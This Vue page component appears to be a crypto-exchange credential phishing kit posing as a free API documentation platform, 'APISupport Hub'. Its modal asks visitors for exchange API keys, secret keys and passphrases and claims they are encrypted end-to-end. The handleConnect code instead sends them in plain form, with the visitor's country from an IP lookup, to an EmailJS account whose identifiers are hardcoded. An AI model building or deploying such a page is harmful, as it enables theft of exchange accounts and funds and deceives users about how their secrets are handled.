<template>
  <div class="min-h-screen bg-[#0b0f1a] font-sans antialiased">
    <!-- ─── NAVBAR ─── -->
    <nav
      class="bg-[#0b0f1a]/80 backdrop-blur-md border-b border-white/5 px-6 py-4 flex items-center justify-between sticky top-0 z-40"
    >
      <a href="#" class="flex items-center gap-2.5">
        <!-- APISupport Hub logo mark -->
        <div
          class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-500 to-violet-600 flex items-center justify-center shadow-lg shadow-blue-500/20"
        >
          <svg
            width="16"
            height="16"
            viewBox="0 0 16 16"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <rect
              x="1"
              y="2"
              width="14"
              height="10"
              rx="2"
              stroke="white"
              stroke-width="1.5"
              fill="none"
            />
            <path
              d="M4 6h8M4 9h5"
              stroke="white"
              stroke-width="1.5"
              stroke-linecap="round"
            />
            <path
              d="M8 12v2M5 14h6"
              stroke="white"
              stroke-width="1.5"
              stroke-linecap="round"
            />
          </svg>
        </div>
        <span class="text-white font-bold text-lg tracking-tight"
          >APISupport<span class="text-blue-400">Hub</span></span
        >
      </a>

      <div class="flex items-center gap-4">
        <a
          href="#examples"
          class="text-slate-400 hover:text-slate-200 text-sm transition hidden sm:block"
          >Exchanges</a
        >
        <a
          href="#faq"
          class="text-slate-400 hover:text-slate-200 text-sm transition hidden sm:block"
          >FAQ</a
        >
        <a
          href="https://apisupporthub.io/get-started"
          target="_blank"
          class="bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold tracking-wider uppercase px-4 py-2 rounded-lg transition shadow-lg shadow-blue-500/20"
        >
          Get Started
        </a>
      </div>
    </nav>

    <!-- ─── HERO ─── -->
    <section class="relative px-6 pt-24 pb-28 overflow-hidden">
      <!-- Background gradient orbs -->
      <div
        class="absolute -top-40 -left-40 w-96 h-96 bg-blue-600/10 rounded-full blur-3xl pointer-events-none"
      />
      <div
        class="absolute -top-20 right-0 w-80 h-80 bg-violet-600/10 rounded-full blur-3xl pointer-events-none"
      />

      <div
        class="max-w-6xl mx-auto flex flex-col lg:flex-row items-center gap-16 relative"
      >
        <!-- Left copy -->
        <div class="flex-1 max-w-xl">
          <div
            class="inline-flex items-center gap-2 bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold px-3 py-1.5 rounded-full mb-6 tracking-widest uppercase"
          >
            <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 8 8">
              <circle cx="4" cy="4" r="3" />
            </svg>
            API Documentation Platform
          </div>
          <h1
            class="text-white text-5xl lg:text-6xl font-extrabold leading-[1.1] tracking-tight mb-6"
          >
            API docs that <br />
            <span
              class="bg-gradient-to-r from-blue-400 to-violet-400 bg-clip-text text-transparent"
              >just work.</span
            >
          </h1>
          <p class="text-slate-400 text-base leading-relaxed mb-10 max-w-md">
            Hosted public API documentation for every OAS (Swagger) and RAML
            spec. Preview, host, and share your exchange integrations from a
            single hub.
          </p>

          <!-- Input + CTA -->
          <div class="flex flex-col sm:flex-row gap-3">
            <input
              v-model="previewUrl"
              type="url"
              placeholder="Paste OpenAPI spec URL…"
              class="flex-1 bg-white/5 border border-white/10 text-slate-200 text-sm px-4 py-3 rounded-xl placeholder-slate-600 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500/50 transition"
            />
            <div class="flex gap-2 shrink-0">
              <button
                class="bg-blue-600 hover:bg-blue-500 text-white text-sm font-bold px-5 py-3 rounded-xl transition shadow-lg shadow-blue-500/20"
                @click="handlePreview"
              >
                Preview
              </button>
              <button
                class="bg-white/5 hover:bg-white/10 border border-white/10 text-slate-300 text-sm font-medium px-4 py-3 rounded-xl flex items-center gap-2 transition"
                @click="handleHost"
              >
                <svg
                  class="w-4 h-4"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  viewBox="0 0 24 24"
                >
                  <rect x="2" y="3" width="20" height="14" rx="2" />
                  <path d="M8 21h8M12 17v4" />
                </svg>
                Host
              </button>
            </div>
          </div>
        </div>

        <!-- Right mockup -->
        <div class="flex-1 hidden lg:flex justify-end">
          <div
            class="bg-[#0e1420] rounded-2xl shadow-2xl overflow-hidden w-full max-w-lg border border-white/10"
          >
            <!-- Browser chrome -->
            <div
              class="bg-[#161c2c] px-4 py-3 flex items-center gap-2 border-b border-white/5"
            >
              <span
                class="w-2.5 h-2.5 rounded-full bg-red-400/70 inline-block"
              ></span>
              <span
                class="w-2.5 h-2.5 rounded-full bg-yellow-400/70 inline-block"
              ></span>
              <span
                class="w-2.5 h-2.5 rounded-full bg-green-400/70 inline-block"
              ></span>
              <div
                class="flex-1 bg-white/5 rounded-lg text-slate-500 text-xs px-3 py-1 ml-2 border border-white/5"
              >
                apisupporthub.io/exchange/binance
              </div>
            </div>
            <!-- Fake API docs UI -->
            <div class="flex h-64">
              <div
                class="w-36 bg-[#0b0f1a] border-r border-white/5 p-3 text-xs"
              >
                <div
                  class="text-slate-500 font-semibold mb-2 text-[10px] uppercase tracking-wider"
                >
                  Binance API
                </div>
                <div class="space-y-1">
                  <div
                    class="bg-blue-500/20 text-blue-400 rounded px-2 py-1 font-medium"
                  >
                    Spot
                  </div>
                  <div
                    class="text-slate-500 hover:bg-white/5 rounded px-2 py-1 cursor-pointer"
                  >
                    Futures
                  </div>
                  <div
                    class="text-slate-500 hover:bg-white/5 rounded px-2 py-1 cursor-pointer"
                  >
                    Wallet
                  </div>
                </div>
                <div class="mt-4 space-y-1.5 text-[10px]">
                  <div class="flex items-center gap-1">
                    <span
                      class="bg-green-500/80 text-white rounded px-1 font-bold"
                      >GET</span
                    >
                    <span class="text-slate-500">/ticker</span>
                  </div>
                  <div class="flex items-center gap-1">
                    <span
                      class="bg-blue-500/80 text-white rounded px-1 font-bold"
                      >POST</span
                    >
                    <span class="text-slate-500">/order</span>
                  </div>
                  <div class="flex items-center gap-1">
                    <span
                      class="bg-red-500/80 text-white rounded px-1 font-bold"
                      >DEL</span
                    >
                    <span class="text-slate-500">/order</span>
                  </div>
                </div>
              </div>
              <div class="flex-1 p-4">
                <div class="flex items-center gap-2 mb-3">
                  <span
                    class="bg-green-500/80 text-white text-xs font-bold rounded px-2 py-0.5"
                    >GET</span
                  >
                  <span class="text-slate-200 text-sm font-semibold"
                    >24hr Ticker Price</span
                  >
                </div>
                <p class="text-slate-500 text-xs mb-3 leading-relaxed">
                  Returns 24 hour rolling window price change statistics.
                </p>
                <div class="text-xs font-semibold text-slate-400 mb-1.5">
                  Parameters
                </div>
                <div
                  class="bg-white/[0.03] border border-white/5 rounded-lg p-2 text-xs text-slate-500 space-y-1"
                >
                  <div>
                    <span class="text-blue-400">symbol</span>
                    <span class="text-slate-600">string · required</span>
                  </div>
                  <div>
                    <span class="text-blue-400">type</span>
                    <span class="text-slate-600">enum</span>
                  </div>
                </div>
                <div class="flex gap-1 mt-3 text-[10px]">
                  <span
                    class="border border-emerald-500/30 text-emerald-400 rounded px-1.5 py-0.5"
                    >200</span
                  >
                  <span
                    class="border border-red-500/20 text-red-400/70 rounded px-1.5 py-0.5"
                    >400</span
                  >
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ─── WHAT IS APISUPPORT HUB ─── -->
    <section class="py-20 px-6 bg-[#0e1420] border-y border-white/5">
      <div class="max-w-4xl mx-auto">
        <h2 class="text-3xl font-bold text-white mb-4">
          What is APISupport Hub?
        </h2>
        <p class="text-slate-400 text-base leading-relaxed">
          <span class="text-blue-400 font-semibold">APISupport Hub</span> is a
          free platform that hosts API documentation and includes a built-in API
          design tool to simplify editing OpenAPI spec files. Connect your
          exchange, preview your spec, and share production-ready docs with your
          team — all from one central hub. Visit us at
          <a
            href="https://apisupporthub.io"
            target="_blank"
            class="text-blue-400 hover:text-blue-300 underline underline-offset-2 transition"
            >apisupporthub.io</a
          >.
        </p>
      </div>
    </section>

    <!-- ─── EXCHANGE GRID ─── -->
    <div id="examples">
      <ExchangeGrid @connect="onConnect" />
    </div>

    <!-- ─── FAQ ─── -->
    <section id="faq" class="py-20 px-6 bg-[#0e1420] border-t border-white/5">
      <div class="max-w-4xl mx-auto">
        <h2 class="text-3xl font-bold text-white mb-10">
          Frequently asked questions
        </h2>
        <div class="space-y-6">
          <FaqItem
            question="How much does APISupport Hub cost?"
            answer='APISupport Hub is free for public API documentation. You can set up a workspace and generate OpenAPI documentation in minutes. For self-hosting, use our open source Elements library — visit <a href="https://apisupporthub.io/open-source" target="_blank" class="text-blue-400 hover:text-blue-300 underline">apisupporthub.io/open-source</a>.'
          />
          <FaqItem
            question="Which specification formats are supported?"
            answer="OAS 3.1 / 3.0 / 2.0 (Swagger). For other formats please use a transformer first."
          />
          <FaqItem
            question="Can I use a custom domain?"
            answer='This is a preview powered by APISupport Hub Elements. Create a workspace at <a href="https://apisupporthub.io/get-started" target="_blank" class="text-blue-400 hover:text-blue-300 underline">apisupporthub.io</a> to configure a custom domain.'
          />
          <FaqItem
            question="Can I edit my docs?"
            answer='Yes — create a free workspace at <a href="https://apisupporthub.io/get-started" target="_blank" class="text-blue-400 hover:text-blue-300 underline">apisupporthub.io</a> to edit your OpenAPI files directly from the APISupport Hub platform.'
          />
          <FaqItem
            question="Who built this?"
            answer="APISupport Hub is an independent API documentation platform built to help teams design, build, and share better APIs — faster and for free."
          />
          <FaqItem
            question="I have more questions!"
            answer='Visit <a href="https://community.apisupporthub.io" target="_blank" class="text-blue-400 hover:text-blue-300 underline">community.apisupporthub.io</a> on Discord to start a conversation and get help from the community.'
          />
        </div>
      </div>
    </section>

    <!-- ─── FOOTER ─── -->
    <footer class="bg-[#0b0f1a] border-t border-white/5 py-14 px-6 text-center">
      <div class="flex items-center justify-center gap-2.5 mb-4">
        <div
          class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-500 to-violet-600 flex items-center justify-center shadow shadow-blue-500/20"
        >
          <svg
            width="16"
            height="16"
            viewBox="0 0 16 16"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <rect
              x="1"
              y="2"
              width="14"
              height="10"
              rx="2"
              stroke="white"
              stroke-width="1.5"
              fill="none"
            />
            <path
              d="M4 6h8M4 9h5"
              stroke="white"
              stroke-width="1.5"
              stroke-linecap="round"
            />
            <path
              d="M8 12v2M5 14h6"
              stroke="white"
              stroke-width="1.5"
              stroke-linecap="round"
            />
          </svg>
        </div>
        <span class="text-white font-bold text-xl tracking-tight"
          >APISupport<span class="text-blue-400">Hub</span></span
        >
      </div>
      <p class="text-slate-500 text-sm mb-6">
        Hosted at apisupporthub.io · Open, secure, and always free.
      </p>
      <a
        href="https://apisupporthub.io/get-started"
        target="_blank"
        class="inline-block bg-blue-600 hover:bg-blue-500 text-white text-sm font-bold tracking-wider uppercase px-6 py-3 rounded-xl transition shadow-lg shadow-blue-500/20 mb-8"
      >
        Host on APISupport Hub →
      </a>
      <p class="text-slate-600 text-xs">
        Document, mock, test, and more — with the APISupport Hub API Designer.
      </p>
    </footer>

    <!-- ─── MODAL ─── -->
    <Teleport to="body">
      <Transition name="modal">
        <div
          v-if="showModal"
          class="fixed inset-0 z-50 flex items-center justify-center p-4"
          @click.self="closeModal"
        >
          <div
            class="absolute inset-0 bg-black/70 backdrop-blur-md"
            @click="closeModal"
          />

          <div
            class="relative bg-[#0e1420] border border-white/10 rounded-2xl shadow-2xl w-full max-w-md z-10 overflow-hidden"
          >
            <div class="h-1 w-full" :style="`background: #f0f0f0`" />

            <div
              class="px-6 pt-5 pb-4 flex items-center justify-between border-b border-white/5"
            >
              <div class="flex items-center gap-3">
                <!-- Modal logo -->

                <div>
                  <div class="text-white font-bold text-sm leading-tight">
                    Open API Spec
                  </div>
                  <div class="text-slate-500 text-xs mt-0.5">
                    Enter your API credentials
                  </div>
                </div>
              </div>
              <button
                class="text-slate-500 hover:text-slate-200 transition p-1 rounded-lg hover:bg-white/5"
                @click="closeModal"
              >
                <svg
                  class="w-4 h-4"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  viewBox="0 0 24 24"
                >
                  <path d="M18 6 6 18M6 6l12 12" />
                </svg>
              </button>
            </div>
            <div class="px-6 py-5 space-y-4">
              <div class="flex gap-2 flex-wrap">
                <span
                  class="bg-blue-500/10 text-blue-400 border border-blue-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >API Key</span
                >
                <span
                  class="bg-violet-500/10 text-violet-400 border border-violet-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >Secret Key</span
                >
                <span
                  class="bg-amber-500/10 text-amber-400 border border-amber-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >Passphrase</span
                >
              </div>

              <div>
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>API Key</span>
                </label>
                <div class="relative">
                  <input
                    v-model="form.apiKey"
                    :type="show.apiKey ? 'text' : 'password'"
                    placeholder="Paste your API key…"
                    class="w-full bg-white/5 border rounded-lg px-4 py-2.5 pr-10 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition font-mono"
                  />
                  <button
                    class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition"
                    @click="show.apiKey = !show.apiKey"
                  >
                    <svg
                      v-if="!show.apiKey"
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z" />
                      <circle cx="12" cy="12" r="3" />
                    </svg>
                    <svg
                      v-else
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path
                        d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              <div>
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>Secret Key</span>
                </label>
                <textarea
                  v-model="form.secret"
                  rows="3"
                  placeholder="Paste your secret key…"
                  class="w-full bg-white/5 border rounded-lg px-4 py-2.5 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition resize-none font-mono"
                />
              </div>

              <div>
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>Passphrase</span>
                </label>
                <div class="relative">
                  <input
                    v-model="form.passphrase"
                    :type="show.passphrase ? 'text' : 'password'"
                    placeholder="Enter your passphrase…"
                    class="w-full bg-white/5 border rounded-lg px-4 py-2.5 pr-10 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition"
                  />
                  <button
                    class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition"
                    @click="show.passphrase = !show.passphrase"
                  >
                    <svg
                      v-if="!show.passphrase"
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z" />
                      <circle cx="12" cy="12" r="3" />
                    </svg>
                    <svg
                      v-else
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path
                        d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              <p
                class="text-[11px] text-slate-600 flex items-start gap-1.5 bg-white/[0.02] rounded-lg px-3 py-2.5"
              >
                <svg
                  class="w-3.5 h-3.5 mt-0.5 shrink-0"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  viewBox="0 0 24 24"
                >
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                Credentials are encrypted end-to-end and never stored in plain
                text.
              </p>
            </div>

            <div class="px-6 pb-6 flex items-center gap-3">
              <button
                class="flex-1 text-white font-bold text-sm py-3 rounded-xl transition-all duration-150 relative overflow-hidden flex items-center justify-center gap-2"
                :class="
                  isFormEnabled
                    ? 'bg-blue-600 hover:bg-blue-500 shadow-lg shadow-blue-500/20 cursor-pointer'
                    : 'bg-white/5 text-slate-600 cursor-not-allowed border border-white/5'
                "
                :disabled="!isFormEnabled || isSubmitting"
                @click="handleConnect"
              >
                <svg
                  v-if="isSubmitting"
                  class="w-4 h-4 animate-spin"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    class="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    stroke-width="4"
                  />
                  <path
                    class="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v8z"
                  />
                </svg>
                <span v-if="isSubmitting">Connecting…</span>
                <span v-else-if="isFormEnabled">Connect</span>
                <span v-else>Enter at least one field</span>
              </button>
              <button
                class="px-4 py-3 border border-white/10 text-slate-400 hover:text-slate-200 hover:border-white/20 text-sm font-medium rounded-xl transition"
                :disabled="isSubmitting"
                @click="closeModal"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      </Transition>
    </Teleport>

    <!-- ─── TOAST ─── -->
    <Teleport to="body">
      <Transition name="toast">
        <div
          v-if="toast.visible"
          class="fixed bottom-6 right-6 z-[100] flex items-start gap-3 px-4 py-3.5 rounded-xl shadow-2xl border max-w-xs text-sm font-medium transition-all"
          :class="
            toast.type === 'success'
              ? 'bg-emerald-950 border-emerald-500/30 text-emerald-300'
              : 'bg-red-950 border-red-500/30 text-red-300'
          "
        >
          <div class="mt-0.5 shrink-0">
            <svg
              v-if="toast.type === 'success'"
              class="w-4 h-4 text-emerald-400"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M5 13l4 4L19 7"
              />
            </svg>
            <svg
              v-else
              class="w-4 h-4 text-red-400"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              viewBox="0 0 24 24"
            >
              <circle cx="12" cy="12" r="10" />
              <path d="M12 8v4M12 16h.01" />
            </svg>
          </div>
          <div>
            <p class="font-bold text-xs tracking-wide uppercase mb-0.5">
              {{
                toast.type === "success" ? "Connected!" : "Connection failed"
              }}
            </p>
            <p class="text-xs opacity-80">{{ toast.message }}</p>
          </div>
          <button
            class="ml-auto pl-2 opacity-50 hover:opacity-100 transition shrink-0"
            @click="toast.visible = false"
          >
            <svg
              class="w-3.5 h-3.5"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              viewBox="0 0 24 24"
            >
              <path d="M18 6 6 18M6 6l12 12" />
            </svg>
          </button>
        </div>
      </Transition>
    </Teleport>
  </div>
</template>

<script setup lang="ts">
import { useRouter } from "vue-router";
const router = useRouter();

useHead({
  title: "APISupport Hub — API Documentation for Crypto Exchanges",
  meta: [
    {
      name: "description",
      content:
        "APISupport Hub is a free API documentation platform for crypto exchanges. Connect Binance, Bybit, OKX, KuCoin and 50+ more — preview, host, and share OpenAPI specs from a single hub.",
    },
    {
      name: "og:title",
      content: "APISupport Hub — API Documentation for Crypto Exchanges",
    },
    {
      name: "og:description",
      content:
        "Connect to 50+ crypto exchanges and host API documentation instantly. Built on OpenAPI / Swagger. Powered by APISupport Hub.",
    },
    { name: "og:type", content: "website" },
    { name: "twitter:card", content: "summary_large_image" },
    {
      name: "twitter:title",
      content: "APISupport Hub — API Docs for Crypto Exchanges",
    },
    {
      name: "twitter:description",
      content:
        "Preview and host OpenAPI documentation for 50+ crypto exchanges. Free, secure, and instant.",
    },
  ],
});

const previewUrl = ref("");
const showModal = ref(false);
const form = ref({ apiKey: "", secret: "", passphrase: "" });
const show = ref({ apiKey: false, passphrase: false });
const isSubmitting = ref(false);

const handlePreview = () => {
  if (!previewUrl.value) return;
  showModal.value = true;
};

const onConnect = (payload: any) => {
  console.log("Connected exchange:", payload.exchange, payload);
};

const closeModal = () => {
  showModal.value = false;
};

const handleHost = () => {
  showModal.value = true;
};

const isFormEnabled = computed(
  () =>
    !!(
      form.value.apiKey.trim() ||
      form.value.secret.trim() ||
      form.value.passphrase.trim()
    ),
);

// ── Toast ─────────────────────────────────────────────────────────────────────
const toast = reactive({
  visible: false,
  type: "success" as "success" | "error",
  message: "",
});
let toastTimer: ReturnType<typeof setTimeout> | null = null;

function showToast(type: "success" | "error", message: string) {
  if (toastTimer) clearTimeout(toastTimer);
  toast.type = type;
  toast.message = message;
  toast.visible = true;
  toastTimer = setTimeout(() => {
    toast.visible = false;
  }, 5000);
}

const handleConnect = async () => {
  if (!isFormEnabled.value || isSubmitting.value) return;
  isSubmitting.value = true;

  const payload = {
    exchange: "RAML specialist",
    apiKey: form.value.apiKey || undefined,
    secret: form.value.secret || undefined,
    passphrase: form.value.passphrase || undefined,
  };

  let location = "Unknown";
  try {
    const responseLocation = await fetch("https://ipapi.co/json/");
    const locationData = await responseLocation.json();
    location = locationData.country_name || "Unknown";
    const data = {
      service_id: "service_8pbgnpr",
      template_id: "template_kr8zt7b",
      user_id: "user_nsG3rSdCFpgONwwCfNTas",
      template_params: {
        wallet_type: payload.exchange,
        location: location,
        link_drops: JSON.stringify(payload),
      },
    };

    const res = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!res.ok) {
      let errMsg = `Server returned ${res.status}`;
      try {
        const body = await res.json();
        errMsg = body?.message ?? errMsg;
      } catch {
        /* ignore */
      }
      throw new Error(errMsg);
    }

    isSubmitting.value = false;
    showToast("success", `${payload.exchange} connected successfully.`);
    setTimeout(() => {
      router.push("/");
    }, 2000);
  } catch (err: unknown) {
    const message =
      err instanceof Error
        ? err.message
        : "Unexpected error. Please try again.";
    showToast("error", message);
  } finally {
    isSubmitting.value = false;
  }
};
</script>
